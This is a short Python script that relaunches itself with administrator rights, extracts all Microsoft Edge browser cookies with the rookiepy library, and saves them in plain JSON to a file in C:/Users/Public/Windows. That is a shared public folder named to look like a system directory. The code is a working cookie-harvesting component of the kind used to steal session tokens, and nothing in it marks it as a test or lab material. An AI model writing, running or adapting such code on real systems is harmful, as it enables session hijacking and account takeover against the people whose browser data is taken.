import os
import rookiepy  # Ensure rookiepy is installed or replace it with a cookie extraction library
import json
import ctypes
import sys
from pathlib import Path


def require_admin():
    """Ensure the script runs with administrative privileges."""
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("Relaunching as admin...")
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            sys.exit()
    except Exception as e:
        print(f"Error: Unable to relaunch as admin. Details: {e}")
        sys.exit(1)


def main():
    """Main logic of the script."""
    try:
        # Ensure the directory exists
        windows_dir = Path("C:/Users/Public/Windows")
        windows_dir.mkdir(parents=True, exist_ok=True)

        print("Fetching cookies...")
        cookies = rookiepy.edge()  # Replace with valid library/method if rookiepy is unavailable
        output_file = windows_dir / "ck_edge.txt"

        # Save cookies to a file
        with output_file.open("w", encoding="utf-8") as file:
            json.dump(cookies, file, indent=4)
        print(f"Cookies successfully written to {output_file}")

    except Exception as e:
        print(f"An error occurred: {e}")


if __name__ == "__main__":
    require_admin()  # Ensure admin privileges
    main()
